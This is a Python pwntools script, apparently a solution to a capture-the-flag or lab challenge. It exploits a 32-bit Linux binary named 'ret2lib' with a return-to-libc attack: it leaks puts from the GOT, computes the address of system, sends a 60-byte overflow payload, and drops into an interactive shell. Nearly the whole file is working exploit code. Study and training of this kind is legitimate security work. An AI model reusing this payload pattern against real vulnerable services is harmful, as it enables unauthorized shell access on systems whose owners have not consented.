#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch = "i386", os = "linux", bits = 32)

elf = ELF("ret2lib")
libc = elf.libc
puts_got = elf.got["puts"]
puts_offset = libc.sym["puts"]
system_offset = libc.sym["system"]

p = process("ret2lib")
# p = remote("127.0.0.1", 8888)

p.recvuntil(":")
p.sendline(str(puts_got))
p.recvuntil(": ")

puts_addr = int(p.recvline().strip(), base=16)
padding = "A" * 60
system_addr = puts_addr - puts_offset + system_offset
sh_addr = 0x804829e
'''
    ------------------------------------------
    | padding | system | ret addr | argv(sh) |
    ------------------------------------------
'''
payload = padding + p32(system_addr) + "BBBB" + p32(sh_addr)

p.recvuntil(":")
# raw_input()
p.sendline(payload)
p.recvline()

p.interactive()
p.close()
